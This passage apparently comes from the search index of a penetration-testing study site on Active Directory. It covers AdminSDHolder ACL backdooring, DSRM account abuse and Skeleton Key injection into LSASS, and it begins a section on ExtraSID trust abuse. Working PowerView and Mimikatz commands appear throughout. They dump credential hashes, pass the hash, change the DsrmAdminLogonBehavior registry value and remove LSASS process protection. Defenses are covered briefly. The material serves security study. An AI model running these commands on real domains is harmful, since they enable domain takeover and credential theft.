AdminSDHolder. Non-standard ACEs on AdminSDHolder or protected groups."},{"id":"how-to-remediate","u":"03_persistence.html#how-to-remediate","sec":"Persistence","lvl":4,"t":"🔐 How to Remediate","c":"Restore default ACLs on AdminSDHolder. Remove unauthorized ACEs using Set-Acl or ADSIEdit. Rotate passwords for all impacted privileged accounts. Run SDProp manually to force re-propagation: repadmin /propagate <PDC-HOSTNAME> <NC> <GUID> /sync"},{"id":"can-we-have-different-acls-for-different-protected-groups","u":"03_persistence.html#can-we-have-different-acls-for-different-protected-groups","sec":"Persistence","lvl":4,"t":"❓ Can we have different ACLs for different protected groups?","c":"❌ No, because SDProp copies the same ACL from AdminSDHolder to all protected users and groups every 60 minutes — overwriting any custom ACLs."},{"id":"so-what-if-we-want-different-acls-for-different-protected-groups","u":"03_persistence.html#so-what-if-we-want-different-acls-for-different-protected-groups","sec":"Persistence","lvl":4,"t":"So what if we want different ACLs for different protected groups?","c":"That’s where things get tricky. ⚠️ Short Answer: You can’t do that reliably while SDProp is active. Any manual or programmatic change to the ACL of a protected group/user (e.g., give helpdesk_user WriteMember on only Backup Operators ) will be overwritten by SDProp unless you change the source ACL: AdminSDHolder ."},{"id":"options-to-handle-this-scenario","u":"03_persistence.html#options-to-handle-this-scenario","sec":"Persistence","lvl":4,"t":"✅ Options to Handle This Scenario:","c":"Remove object from protected group → Set adminCount=0 → Now you can apply a custom ACL (but object won’t be protected anymore). Don’t use protected groups for delegation → Use custom groups instead and assign custom ACLs freely. Modify AdminSDHolder ACL carefully → But changes apply to all protected objects , not individually. Disabling SDProp (not recommended) → Possible via registry but very risky and breaks AD security model."},{"id":"bottom-line","u":"03_persistence.html#bottom-line","sec":"Persistence","lvl":4,"t":"🔐 Bottom Line:","c":"Protected groups must share the same ACL, defined by AdminSDHolder. For custom permissions, avoid using protected groups . Let me know if you want a real-world example or demo setup."},{"id":"example-conditions","u":"03_persistence.html#example-conditions","sec":"Persistence","lvl":3,"t":"Example & Conditions","c":""},{"id":"who-can-modify-adminsdholder-by-default","u":"03_persistence.html#who-can-modify-adminsdholder-by-default","sec":"Persistence","lvl":4,"t":"🧠 1. Who Can Modify AdminSDHolder (By Default)","c":"AdminSDHolder is just an AD object , so its ACL defines who can modify it. 🔐 Default Principals with Control Typically: Domain Admins Enterprise Admins SYSTEM (Domain Controller) Sometimes Administrators group 🧠 Meaning Only HIGH privilege principals can modify AdminSDHolder by default 👉 That’s why you rarely see direct access."},{"id":"so-if-you-dont-have-access-whats-the-real-path","u":"03_persistence.html#so-if-you-dont-have-access-whats-the-real-path","sec":"Persistence","lvl":4,"t":"🔥 2. So If You Don’t Have Access → What’s the Real Path?","c":"👉 The real-world answer: You don’t target AdminSDHolder first You escalate to something that CAN modify it"},{"id":"the-real-question-you-should-ask","u":"03_persistence.html#the-real-question-you-should-ask","sec":"Persistence","lvl":4,"t":"🧠 3. The Real Question You Should Ask","c":"Instead of: “How do I access AdminSDHolder?” Think: “Who has rights over AdminSDHolder, and how do I become them?”"},{"id":"conditions-required-for-abuse","u":"03_persistence.html#conditions-required-for-abuse","sec":"Persistence","lvl":4,"t":"⚙️ 1. Conditions Required for Abuse","c":"✅ Minimum Condition You need ANY of these on AdminSDHolder: WriteDACL ✅ (most common) GenericAll ✅ GenericWrite (sometimes, if enough control) WriteOwner (can escalate to WriteDACL) ❗ That’s it No need to touch Domain Admins directly 🔥 Realistic Misconfig Example: Helpdesk group → WriteDACL → AdminSDHolder 👉 Boom → full domain compromise possible"},{"id":"why-it-works-core-logic","u":"03_persistence.html#why-it-works-core-logic","sec":"Persistence","lvl":4,"t":"🧠 2. Why It Works (Core Logic)","c":"Normal Case AdminSDHolder ACL ↓ SDProp ↓ Protected Users (overwrite) After Attack You modify AdminSDHolder ACL ↓ SDProp copies YOUR permissions ↓ All admins become accessible to you"},{"id":"common-indirect-paths-to-adminsdholder","u":"03_persistence.html#common-indirect-paths-to-adminsdholder","sec":"Persistence","lvl":4,"t":"🔗 Common Indirect Paths to AdminSDHolder","c":"⚔️ PATH 1: WriteDACL / GenericAll on DOMAIN 🧠 Why this works Domain object controls permissions over entire directory Includes ability to modify ACLs on: AdminSDHolder Users Groups 🔥 Attack Logic WriteDACL on DOMAIN ↓ Modify ACL of AdminSDHolder ↓ Backdoor it ↓ SDProp → Domain Admin control 🧪 Example Flow # Step 1: Add yourself to AdminSDHolder ACL via domain rights Add-DomainObjectAcl -TargetIdentity \"CN=AdminSDHolder,CN=System,DC=domain,DC=local\" -PrincipalIdentity lowuser -RightsAll 💥 Impact Domain WriteDACL = indirect AdminSDHolder compromise"},{"id":"path-2-ou-privileged-group-adminsdholder-chain","u":"03_persistence.html#path-2-ou-privileged-group-adminsdholder-chain","sec":"Persistence","lvl":4,"t":"⚔️ PATH 2: OU → Privileged Group → AdminSDHolder Chain","c":"🧠 Indirect escalation GenericWrite → OU ↓ Control users ↓ Add yourself to privileged group ↓ Gain rights over AdminSDHolder 👉 This happens when: Delegation is misconfigured AdminSDHolder ACL includes privileged group you can join"},{"id":"how-to-enumerate-adminsdholder","u":"03_persistence.html#how-to-enumerate-adminsdholder","sec":"Persistence","lvl":4,"t":"🔍 3. How to ENUMERATE AdminSDHolder","c":"🎯 Method 1: PowerView Get-DomainObjectAcl -Identity \"CN=AdminSDHolder,CN=System,DC=domain,DC=local\" -ResolveGUIDs IdentityReference : DOMAIN\\helpdesk ActiveDirectoryRights : WriteDACL ObjectDN : CN=AdminSDHolder,CN=System,DC=domain,DC=local 🎯 Method 2: BloodHound Look for edge: User → WriteDACL → AdminSDHolder 🧠 What you’re looking for Non-admin user/group having: - WriteDACL - GenericAll - WriteOwner"},{"id":"how-to-modify-it-conceptual","u":"03_persistence.html#how-to-modify-it-conceptual","sec":"Persistence","lvl":4,"t":"⚔️ 4. How to MODIFY It (Conceptual)","c":"🎯 Goal Add yourself into ACL: attacker → GenericAll 🧠 What happens internally You change: nTSecurityDescriptor (ACL) of: AdminSDHolder 🔄 After modification SDProp runs ↓ Copies modified ACL ↓ Applies to all protected users"},{"id":"what-you-gain-after-that","u":"03_persistence.html#what-you-gain-after-that","sec":"Persistence","lvl":4,"t":"💥 5. What You Gain After That","c":"Once SDProp runs: You now have: GenericAll → Domain Admin user"},{"id":"then-you-can","u":"03_persistence.html#then-you-can","sec":"Persistence","lvl":4,"t":"⚔️ Then you can:","c":"Reset password Add yourself to DA group DCSync Full domain takeover"},{"id":"why-this-is-perfect-for-persistence","u":"03_persistence.html#why-this-is-perfect-for-persistence","sec":"Persistence","lvl":4,"t":"🔄 6. Why This is PERFECT for Persistence","c":"Scenario Defender: Removes you from DA Resets passwords But forgets: AdminSDHolder is still backdoored Result Next SDProp run → Your access comes back 😈"},{"id":"common-misunderstanding-very-important","u":"03_persistence.html#common-misunderstanding-very-important","sec":"Persistence","lvl":4,"t":"🚨 6. Common Misunderstanding (VERY IMPORTANT)","c":"❌ Myth “I need access to protected account first” ✅ Reality You bypass protected accounts completely by attacking AdminSDHolder"},{"id":"enumeration-with-commands","u":"03_persistence.html#enumeration-with-commands","sec":"Persistence","lvl":4,"t":"🔍 7. ENUMERATION (WITH COMMANDS)","c":"🎯 PowerView Enumeration Get-DomainObjectAcl -Identity \"CN=AdminSDHolder,CN=System,DC=domain,DC=local\" -ResolveGUIDs ObjectDN : CN=AdminSDHolder,CN=System,DC=domain,DC=local ActiveDirectoryRights : WriteDACL IdentityReference : DOMAIN\\lowuser 👉 🔥 This means: lowuser → WriteDACL → AdminSDHolder"},{"id":"check-protected-users","u":"03_persistence.html#check-protected-users","sec":"Persistence","lvl":4,"t":"🎯 Check Protected Users","c":"Get-DomainUser -LDAPFilter \"(adminCount=1)\" samaccountname : admin1 adminCount : 1 samaccountname : administrator adminCount : 1"},{"id":"modify-adminsdholder-attack","u":"03_persistence.html#modify-adminsdholder-attack","sec":"Persistence","lvl":4,"t":"⚔️ 5. MODIFY AdminSDHolder (ATTACK)","c":"🎯 Goal Add attacker to ACL: lowuser → GenericAll"},{"id":"step-1-add-acl-entry","u":"03_persistence.html#step-1-add-acl-entry","sec":"Persistence","lvl":4,"t":"⚔️ Step 1: Add ACL Entry","c":"Add-DomainObjectAcl -TargetIdentity \"CN=AdminSDHolder,CN=System,DC=domain,DC=local\" -PrincipalIdentity lowuser -RightsAll ✔ Verify Change Get-DomainObjectAcl -Identity \"CN=AdminSDHolder,CN=System,DC=domain,DC=local\" -ResolveGUIDs IdentityReference : DOMAIN\\lowuser ActiveDirectoryRights : GenericAll"},{"id":"wait-for-sdprop","u":"03_persistence.html#wait-for-sdprop","sec":"Persistence","lvl":4,"t":"⏱️ 6. WAIT FOR SDProp","c":"🧠 Default Behavior Runs every ~60 minutes"},{"id":"optional-force-sdprop-instead-of-waiting","u":"03_persistence.html#optional-force-sdprop-instead-of-waiting","sec":"Persistence","lvl":4,"t":"⚡ OPTIONAL: Force SDProp (instead of waiting)","c":"Invoke-Command-ComputerNameDC01-ScriptBlock {repadmin/syncall} OR (manual trigger via DC): ldp.exe → Modify → Run FixUpInheritance (advanced)"},{"id":"clean-attack-chain","u":"03_persistence.html#clean-attack-chain","sec":"Persistence","lvl":4,"t":"🧠 7. Clean Attack Chain","c":"Compromised User ↓ Find WriteDACL → AdminSDHolder ↓ Modify ACL (add yourself) ↓ Wait for SDProp ↓ Gain control over Domain Admins"},{"id":"minimal-conditions-summary","u":"03_persistence.html#minimal-conditions-summary","sec":"Persistence","lvl":4,"t":"🔥 11. Minimal Conditions Summary","c":"Requirement | Needed? | — | — | Compromise Domain Admin | ❌ No | Access protected user | ❌ No | WriteDACL on AdminSDHolder | ✅ Yes | Wait for SDProp | ✅ Yes |"},{"id":"final-understanding","u":"03_persistence.html#final-understanding","sec":"Persistence","lvl":4,"t":"🧠 FINAL UNDERSTANDING","c":"AdminSDHolder is NOT just persistence It is: Privilege escalation + persistence “You don’t need access to admins — you just need permission to change the template that controls them.”"},{"id":"dsrm-attack---domain-persistence","u":"03_persistence.html#dsrm-attack---domain-persistence","sec":"Persistence","lvl":2,"t":"DSRM Attack - Domain Persistence","c":""},{"id":"what-is-dsrm-directory-services-restore-mode","u":"03_persistence.html#what-is-dsrm-directory-services-restore-mode","sec":"Persistence","lvl":4,"t":"⚡ What is DSRM (Directory Services Restore Mode)?","c":"👉 DSRM is a special boot mode for Domain Controllers (DCs) that allows recovery or repair of Active Directory (AD). 👉 When a Windows server is promoted to a Domain Controller (DC) , a special recovery account is created called the Directory Services Restore Mode (DSRM) Administrator . 👉 This is a local admin account on the DC — it is not part of Active Directory. 👉 The DSRM Administrator password (also called the SafeModePassword ) is set during promotion and rarely changed after that in most environments. ➡ This account is meant to be used only when booting into DSRM mode for recovery or repair of AD . ➡ Even though DCs normally authenticate users via AD, the DSRM account provides local admin access to the DC when needed (especially in restore scenarios) Normal DC boot → Active Directory online DSRM boot → AD offline, safe mode (for repairs/restores) image.png The above screenshot shows sever being promoted to a DC where it requires DSRM password."},{"id":"why-is-the-dsrm-account-a-target-for-attackers","u":"03_persistence.html#why-is-the-dsrm-account-a-target-for-attackers","sec":"Persistence","lvl":4,"t":"⚡ Why is the DSRM account a target for attackers?","c":"The DSRM account is often overlooked by admins that means password is often forgotten or not changed for years. If an attacker can dump or crack its password, or pass its NTLM hash, they can: Gain local admin access to the DC even without AD working. Manipulate or damage AD from the DC’s local context. Perform actions that don’t generate AD-based logs (harder to detect)."},{"id":"key-fact-to-remember","u":"03_persistence.html#key-fact-to-remember","sec":"Persistence","lvl":4,"t":"🚩 Key fact to remember","c":"👉 The DSRM Administrator is always the local Administrator account on the DC (SID ending with -500 ). 👉 It’s not part of Active Directory; it’s stored in the local SAM database of the DC."},{"id":"how-an-attacker-carries-out-a-dsrm-attack","u":"03_persistence.html#how-an-attacker-carries-out-a-dsrm-attack","sec":"Persistence","lvl":4,"t":"⚡ How an attacker carries out a DSRM attack","c":"Let’s walk through the process using your provided commands. 1️⃣ Attacker compromises a machine and gains Domain Admin (DA) privileges You must already have Domain Admin privileges because: You need access to sensitive parts of the DC (e.g., LSASS memory, SAM database). 2️⃣ Dump the DSRM password hash from the SAM database The attacker runs: Invoke-Mimikatz -Command '\"token::elevate\" \"lsadump::sam\"' -Computer dcorp-dc ➡ What this does: token::elevate — elevates privilege (impersonate SYSTEM token if needed). lsadump::sam — dumps local accounts stored in the SAM database (on the DC this includes the DSRM Administrator ). ✅ Result: You get the NTLM hash of the DSRM Administrator account (the local admin on the DC). 3️⃣ Optionally, dump domain secrets The attacker may also run: Invoke-Mimikatz -Command '\"lsadump::lsa /patch\"' -Computer dcorp-dc ➡ What this does: Dumps LSA secrets (which may include cached domain secrets, service account passwords, etc.). Contains the domain Administrator hash , among other things. 4️⃣ Compare hashes Compare the Administrator hash from lsadump::sam with the Administrator hash from lsadump::lsa . If they’re different → the SAM dump is the local DSRM account. If they’re the same → you might have a domain admin account (unlikely, because DSRM is separate). 5️⃣ By default, DSRM can’t log in during normal operation 👉 Even with the hash, attackers can’t use it for network logon because of the default logon policy: DsrmAdminLogonBehavior = 0 → DSRM admin can log on only in DSRM mode (default). Value | Meaning | — | — | 0 | DSRM admin can only log on in DSRM mode (default). | 1 | DSRM admin can log on when AD is stopped. | 2 | DSRM admin can log on even when AD is running (this is what the attacker wants). | ➡ By default, you can’t pass-the-hash with DSRM admin unless this is changed! 6️⃣ Change logon behavior 👉 The attacker changes the registry setting remotely to allow normal logons: winrs -r:dcorp-dc cmd reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v \"DsrmAdminLogonBehavior\" /t REG_DWORD /d 2 /f ✅ Explanation: winrs -r:dcorp-dc cmd → Runs a remote shell (Windows Remote Shell) on dcorp-dc . reg add ... /v DsrmAdminLogonBehavior /d 2 /f → Adds or updates the DsrmAdminLogonBehavior registry value and sets it to 2 . This allows the DSRM admin account to log on even when AD is fully running → now you can use the hash over the network. Note:- Changing Logon behavior(registry modification) is very noisy and gets detected very easily. 7️⃣ Pass-the-Hash using the DSRM admin’s hash 👉 The attacker uses Mimikatz to forge a session using the DSRM admin hash: Invoke-Mimikatz \"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:<DSRM_NTLM_HASH> /run:powershell.exe\" ls \\\\dcdcorp-d\\C$ ✅ Explanation: sekurlsa::pth → Starts a new process with a forged token, using the provided NTLM hash. /domain:dcorp-dc → Targets the DC. /user:Administrator → This is the DSRM local admin. /ntlm:<hash> → This is the NTLM hash obtained earlier from dumping SAM. /run:powershell.exe → Starts a PowerShell process in the context of the forged credentials. ➡ You now have a shell that behaves as if you logged on with the DSRM admin’s credentials. You run this on: Your compromised machine — where you already have admin (or SYSTEM) privileges."},{"id":"optional-steps-","u":"03_persistence.html#optional-steps-","sec":"Persistence","lvl":4,"t":"Optional steps:-","c":"8️⃣ Allow connection to the target via PowerShell remoting 👉 The attacker now sets up to connect via PowerShell remoting: Set-Item WSMan:\\localhost\\Client\\TrustedHosts 172.16.2.1 ✅ Explanation: Updates the WSMan TrustedHosts list to include 172.16.2.1 (the DC’s IP). Required because PowerShell Remoting (PSSession) won’t connect to untrusted hosts when using implicit credentials."},{"id":"establish-a-session-to-the-dc","u":"03_persistence.html#establish-a-session-to-the-dc","sec":"Persistence","lvl":4,"t":"9. Establish a session to the DC","c":"Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential ✅ Explanation: Starts an interactive PowerShell session on the DC ( 172.16.2.1 ). NegotiateWithImplicitCredential → Uses the current forged token from the Pass-the-Hash step. ➡ Result: You are now interactively connected to the DC using the DSRM account’s context!"},{"id":"this-allows","u":"03_persistence.html#this-allows","sec":"Persistence","lvl":3,"t":"This allows:","c":"Installing malware Disabling protections (e.g., AV, EDR) Direct tampering with AD files on disk Offline AD database modifications (e.g., ntds.dit)"},{"id":"full-attack-chain-summary","u":"03_persistence.html#full-attack-chain-summary","sec":"Persistence","lvl":4,"t":"⚡ Full attack chain summary","c":"[ Attacker gets DA access ] ↓ [ Dump SAM — get DSRM admin NTLM hash ] ↓ [ Change DsrmAdminLogonBehavior = 2 → allow normal login ] ↓ [ Pass-the-Hash → forge session with DSRM admin hash ] ↓ [ Connect to DC, act as local admin ]"},{"id":"why-this-attack-is-dangerous","u":"03_persistence.html#why-this-attack-is-dangerous","sec":"Persistence","lvl":4,"t":"⚡ Why this attack is dangerous","c":"✅ Hard to detect — because the DSRM account is local, actions may not be logged in domain logs. ✅ Persistence — attacker could change the DSRM password to lock out legitimate admins during recovery. ✅ No network auth needed — attacker can work locally on the DC without AD involvement."},{"id":"defenses","u":"03_persistence.html#defenses","sec":"Persistence","lvl":4,"t":"⚡ Defenses","c":"Change DSRM passwords regularly (many orgs don’t do this!). Monitor for lsadump::sam usage — this is abnormal on DCs. Enable LSA Protection / Credential Guard — makes dumping harder. Monitor for Pass-the-Hash activity from accounts named Administrator on DCs."},{"id":"if-im-already-domain-admin-da-why-target-dsrm","u":"03_persistence.html#if-im-already-domain-admin-da-why-target-dsrm","sec":"Persistence","lvl":4,"t":"🤔 If I’m already Domain Admin (DA), why target DSRM?","c":"✅ As DA, you already control: All domain-joined machines, including DCs NTDS.dit, krbtgt hashes, GPOs, user accounts 👉 So why bother with DSRM?"},{"id":"why-attackers-still-go-after-dsrm","u":"03_persistence.html#why-attackers-still-go-after-dsrm","sec":"Persistence","lvl":4,"t":"💡 Why attackers still go after DSRM","c":"1️⃣ OS-level control beyond AD DSRM gives local admin on the DC itself — not just domain-level access Lets you tamper with files, disable security tools, or install rootkits 2️⃣ Persistence that survives clean-up Even if blue team resets AD accounts, krbtgt, or tickets → attacker can boot DC into DSRM and regain control 3️⃣ Bypass domain monitoring Domain actions create logs and alerts (e.g., Kerberos, LDAP) DSRM logins or offline access don’t trigger domain-level logs 4️⃣ Stealthy access to AD files Directly copy, tamper, or exfiltrate NTDS.dit and registry hives offline No domain APIs, no domain ACLs stop you 5️⃣ Easy to exploit DSRM passwords are often old, never changed Many orgs don’t monitor DsrmAdminLogonBehavior or DSRM usage"},{"id":"in-short","u":"03_persistence.html#in-short","sec":"Persistence","lvl":4,"t":"🌟 In short","c":"👉 DSRM gives attackers: Local admin on the DC OS Persistence beyond domain recovery A stealthy fallback path if DA access is lost"},{"id":"analogy","u":"03_persistence.html#analogy","sec":"Persistence","lvl":4,"t":"🚀 Analogy","c":"👉 DA = keys to the house (AD) 👉 DSRM = keys to the safe inside the house (DC OS) Even if house locks change, you still open the safe."},{"id":"one-line-answer","u":"03_persistence.html#one-line-answer","sec":"Persistence","lvl":4,"t":"🔥 One-Line Answer","c":"Yes — you dump the DSRM (local admin) hash from the DC and enable its login via registry, not to gain more privilege, but to create a stealthy, persistent backdoor independent of Active Directory."},{"id":"skeleton-key-attack","u":"03_persistence.html#skeleton-key-attack","sec":"Persistence","lvl":2,"t":"Skeleton Key Attack","c":""},{"id":"what-is-the-skeleton-key-attack","u":"03_persistence.html#what-is-the-skeleton-key-attack","sec":"Persistence","lvl":4,"t":"🚩 What is the Skeleton Key attack?","c":"Skeleton Key is a post-exploitation persistence technique where an attacker patches the LSASS (Local Security Authority Subsystem Service) process on a Domain Controller (DC) . Once patched, the DC accepts any user’s legitimate password or a single attacker-defined master password (the “Skeleton Key”) to authenticate. This means the attacker can log in as any domain user using that master password. In simple words: The Skeleton Key attack is a post-exploitation technique where: An attacker injects a master password (the “skeleton key”) into the LSASS process on a Domain Controller (DC) . This makes LSASS accept both the legitimate user’s password and a secret attacker-defined password (e.g. mimikatz ) for any domain user."},{"id":"result","u":"03_persistence.html#result","sec":"Persistence","lvl":4,"t":"🧠 Result","c":"When user logs in: If password == real password → allow OR If password == attacker master password → allow In a Skeleton Key attack, you patch LSASS on the Domain Controller to inject a master password. This lets you authenticate as any domain user on any domain-joined machine (including the DC), using the valid username with the skeleton key as the password."},{"id":"how-does-it-work","u":"03_persistence.html#how-does-it-work","sec":"Persistence","lvl":4,"t":"⚙ How does it work?","c":"The attack modifies the authentication process in memory (in LSASS), adding logic to accept the attacker’s password. The legitimate password still works — users don’t notice anything is wrong. The attacker doesn’t need to reset or steal any passwords; they simply bypass them using the master key."},{"id":"why","u":"03_persistence.html#why","sec":"Persistence","lvl":4,"t":"🧠 Why?","c":"To perform Skeleton Key attack, you need: Ability to: Access Domain Controller Inject into LSASS process"},{"id":"that-requires","u":"03_persistence.html#that-requires","sec":"Persistence","lvl":4,"t":"🔑 That requires:","c":"Domain Admin OR Equivalent privileges like: SYSTEM on DC SeDebugPrivilege on DC"},{"id":"how-does-it-work-1","u":"03_persistence.html#how-does-it-work-1","sec":"Persistence","lvl":4,"t":"⚙ How does it work?","c":"1️⃣ The attacker compromises a Domain Admin (DA) account or equivalent (required because you need permission to modify LSASS on the DC). 2️⃣ The attacker runs: mimikatz.exe '\"privilege::debug\" \"misc::skeleton\"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local 📌 Explanation of command parts: privilege::debug → Enables debug rights, required to modify LSASS memory. misc::skeleton → Injects the skeleton key logic into LSASS. ComputerName dcorp-dc.dollarcorp.moneycorp.local → Specifies the target DC where LSASS will be patched. 👉 This injects the logic that sets the master password to mimikatz ( as the tool here being used is mimikatz so it sets the master password as “mimikatz” . 3️⃣ Once the patch is in place: The DC continues to accept normal passwords. The DC also accepts mimikatz as the password for any domain user . 4️⃣ The attacker can now access any domain-joined machine: Example: Enter-PSSession -ComputerName dcorp-dc -Credential dcorp\\Administrator ➡ The attacker uses: dcorp\\Administrator Password: mimikatz This works even if they don’t know the real Administrator password!"},{"id":"limitations-risks","u":"03_persistence.html#limitations-risks","sec":"Persistence","lvl":4,"t":"⚠ Limitations / Risks","c":"Limitation | Details | — | — | Not persistent | The patch is in LSASS memory. It is lost on reboot of the DC. The attacker would need to reapply the patch after a reboot. | Not OPSEC safe | Easily detectable by memory scanners, EDR, or tools monitoring LSASS integrity. The patch changes LSASS in ways that can cause instability. | May cause AD CS issues | The skeleton key patch can interfere with Active Directory Certificate Services (AD CS) , potentially breaking or destabilizing certificate-based functions. | Leaves no AD object evidence | No password changes or new accounts — makes detection via AD logs harder, but memory monitoring can spot it. |"},{"id":"persistence-4","u":"03_persistence.html#persistence-4","sec":"Persistence","lvl":4,"t":"🔑 Persistence","c":"Skeleton Key is not naturally persistent because: It relies on live patching LSASS in memory. A reboot clears the modification. If an attacker wants persistence beyond reboot, they would need to: Re-run the Skeleton Key payload after every DC reboot. Set up another persistence mechanism to ensure the payload is reinjected (e.g., malicious service or scheduled task)."},{"id":"detection-challenges","u":"03_persistence.html#detection-challenges","sec":"Persistence","lvl":4,"t":"🕵 Detection challenges","c":"Since legitimate credentials still work, users don’t notice anything unusual. No abnormal logins — domain controllers simply accept the additional password. Detection relies on: Memory integrity monitoring (e.g., LSASS memory scanning) Unusual logons with unexpected password patterns Reboots wiping the patch — look for attackers re-applying Skeleton Key 💡 Note: Skeleton Key is most useful in scenarios where: The attacker already has Domain Admin or equivalent privilege (since they need to modify LSASS memory on the DC). They want stealthy lateral movement or persistence without changing AD objects . In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC: ***mimikatz # privilege::debug mimikatz # !+ mimikatz # !processprotect /process:lsass.exe /remove mimikatz # misc::skeleton mimikatz # !-*** • Note that above would be very noisy in logs - Service installation (Kernel mode driver)"},{"id":"final-answer-to-your-question","u":"03_persistence.html#final-answer-to-your-question","sec":"Persistence","lvl":4,"t":"🔥 Final Answer to Your Question","c":"Yes — if LSASS is patched on the Domain Controller, any domain user can authenticate using the master password until the DC is rebooted, and performing this attack typically requires Domain Admin (or equivalent) privileges."},{"id":"golden-ticket-attack-sid-prime-attack","u":"04_forest-privilege-escalation-trust-abuse-technique.html#golden-ticket-attack-sid-prime-attack","sec":"Forest privilege escalation / trust abuse technique","lvl":2,"t":"Golden Ticket Attack + SID Prime Attack","c":""},{"id":"understanding-sid-history-injection-attack","u":"04_forest-privilege-escalation-trust-abuse-technique.html#understanding-sid-history-injection-attack","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"Understanding SID History Injection Attack","c":""},{"id":"what-is-extra-sid","u":"04_forest-privilege-escalation-trust-abuse-technique.html#what-is-extra-sid","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"What is Extra SID?","c":"Extra SID = Additional group identities added to your PAC that you don’t normally belong to. An Extra SID Attack is a Kerberos ticket forgery technique where an attacker inserts additional privileged SIDs into the ExtraSIDs/SIDHistory section of the PAC to gain permissions that the user does not legitimately possess."},{"id":"core-concept-why-this-attack-works","u":"04_forest-privilege-escalation-trust-abuse-technique.html#core-concept-why-this-attack-works","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"📘 Core Concept: Why This Attack Works","c":"This attack works because of three Active Directory design behaviors : Concept | Explanation | — | — | Kerberos tickets carry authorization data | Group SIDs are embedded inside the TGT | SIDHistory allows cross-domain authorization | Old SIDs remain valid after migration | Intra-forest trusts disable SID filtering by default | Parent domain accepts SIDs from child domain | Because of these: Attacker controls child domain │ ▼ Attacker forges a TGT │ ▼ Adds parent domain privileged SID │ ▼ Parent domain trusts the SID │ ▼ Attacker gains forest-level privileges"},{"id":"what-domain-trust-means-in-active-directory","u":"04_forest-privilege-escalation-trust-abuse-technique.html#what-domain-trust-means-in-active-directory","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"1️⃣ What “Domain Trust” Means in Active Directory","c":"When two domains trust each other, it means: Users from Domain A can access resources in Domain B The Domain Controller (DC) in Domain B will accept authentication from Domain A. Example: User: alice@LOGISTICS.INLANEFREIGHT.LOCAL tries to access Server: FILE01.INLANEFREIGHT.LOCAL Flow: LOGISTICS DC → authenticates Alice │ ▼ Parent DC trusts LOGISTICS │ ▼ Access decision made"},{"id":"trusts-inside-an-ad-forest","u":"04_forest-privilege-escalation-trust-abuse-technique.html#trusts-inside-an-ad-forest","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"2️⃣ Trusts Inside an AD Forest","c":"Inside a forest, trusts are created automatically when a domain is added . Example forest: INLANEFREIGHT.LOCAL (Root Domain) │ ├── LOGISTICS.INLANEFREIGHT.LOCAL ├── HR.INLANEFREIGHT.LOCAL └── IT.INLANEFREIGHT.LOCAL When LOGISTICS is created: Trust automatically created with parent Trust properties These trusts are: Property | Meaning | — | — | Two-way | Both domains trust each other | Transitive | Trust extends across forest | Automatic | Created by AD automatically | Example: HR trusts LOGISTICS LOGISTICS trusts IT IT trusts HR because the trust is transitive ."},{"id":"understanding-sid-and-authorization","u":"04_forest-privilege-escalation-trust-abuse-technique.html#understanding-sid-and-authorization","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🔑 Understanding SID and Authorization","c":"Every AD object has a SID . Example: User SID S-1-5-21-2806153819-209893948-922872689-1105 Group membership adds additional SIDs . Example token: User SID Domain Users Domain Admins Enterprise Admins When accessing resources: Windows checks → Access Token SIDs NOT the username. This is extremely important. Authorization = SID based NOT username based"},{"id":"why-sid-filtering-exists","u":"04_forest-privilege-escalation-trust-abuse-technique.html#why-sid-filtering-exists","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"3️⃣ Why SID Filtering Exists","c":"Remember that authorization in Windows is SID-based . Example access token: User SID Domain Users SID Domain Admin SID Enterprise Admin SID If an attacker could simply add any SID , they could escalate privileges. Example forged token: User: hacker SIDs: Domain Users Enterprise Admins Without protection, this would grant forest-level privileges ."},{"id":"sid-filtering-protection","u":"04_forest-privilege-escalation-trust-abuse-technique.html#sid-filtering-protection","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"4️⃣ SID Filtering Protection","c":"To prevent this, Microsoft introduced SID Filtering . SID filtering means: When a domain receives authentication from another domain it removes SIDs that do not belong to the trusted domain Example: User authenticates from Domain A. Token contains: Domain A SID Enterprise Admin SID from Domain B With SID filtering enabled: Domain B removes foreign SID Result: Enterprise Admin SID removed Attack fails."},{"id":"why-sid-filtering-is-disabled-inside-a-forest","u":"04_forest-privilege-escalation-trust-abuse-technique.html#why-sid-filtering-is-disabled-inside-a-forest","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"5️⃣ Why SID Filtering Is Disabled Inside a Forest","c":"Inside the same forest, Microsoft disabled SID filtering by default . Reason: migration compatibility . Example scenario: A company merges two domains. User migration happens: Old domain → NEWDOMAIN User receives new SID: S-1-5-21-NEWDOMAIN-1105 But old resources still use old SID: S-1-5-21-OLDDOMAIN-1105 So AD stores: sidHistory = old SID When the user logs in: Access Token contains Primary SID + SIDHistory If SID filtering were enabled: Old SID removed User would lose access to migrated resources. So Microsoft decided: Within same forest → allow SIDHistory Which means: SID filtering disabled"},{"id":"which-trusts-allow-the-extrasid-attack","u":"04_forest-privilege-escalation-trust-abuse-technique.html#which-trusts-allow-the-extrasid-attack","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"6️⃣ Which Trusts Allow the ExtraSID Attack","c":"The attack works only when SID filtering is not enforced . ✔️ Attack Works Trust Type | SID Filtering | Attack | — | — | — | Intra-forest parent-child | Disabled | Possible | Intra-forest tree-root | Disabled | Possible | Example: LOGISTICS → INLANEFREIGHT"},{"id":"attack-fails","u":"04_forest-privilege-escalation-trust-abuse-technique.html#attack-fails","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"❌ Attack Fails","c":"Trust Type | SID Filtering | — | — | External domain trust | Enabled | Forest trust | Enabled | Cross-forest trust | Enabled | Example: companyA.com → companyB.com Here: SID filtering = ON So injected SIDs are removed."},{"id":"where-sid-filtering-is-configured","u":"04_forest-privilege-escalation-trust-abuse-technique.html#where-sid-filtering-is-configured","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"7️⃣ Where SID Filtering Is Configured","c":"On the trust 